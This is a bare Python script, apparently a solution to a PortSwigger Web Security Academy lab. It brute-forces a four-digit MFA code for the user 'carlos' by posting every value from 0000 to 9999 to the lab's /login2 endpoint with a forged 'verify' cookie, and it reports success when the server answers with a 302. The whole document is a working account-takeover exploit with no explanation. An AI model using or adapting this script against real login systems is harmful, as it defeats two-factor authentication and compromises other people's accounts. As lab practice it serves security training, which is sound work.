import requests

url = "https://0aab000004d08a8a8097f3db00560084.web-security-academy.net/login2"

cookies = {
    'verify': 'carlos' 
}

print("[+] Starting MFA Brute-Force...")

for i in range(10000):
    number = '{:04d}'.format(i)
    
    data = {
        'mfa-code': number
    }
    
    try:

        response = requests.post(url, cookies=cookies, data=data, allow_redirects=False)
        

        if response.status_code == 302:
            print("\n" + "="*40)
            print(f"[+] SUCCESS! Found Valid MFA Code: {number}")
            print("="*40)
            break
            
        if i % 500 == 0:
            print(f"[*] Testing codes... reached: {number}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error at code {number}: {e}")
        continue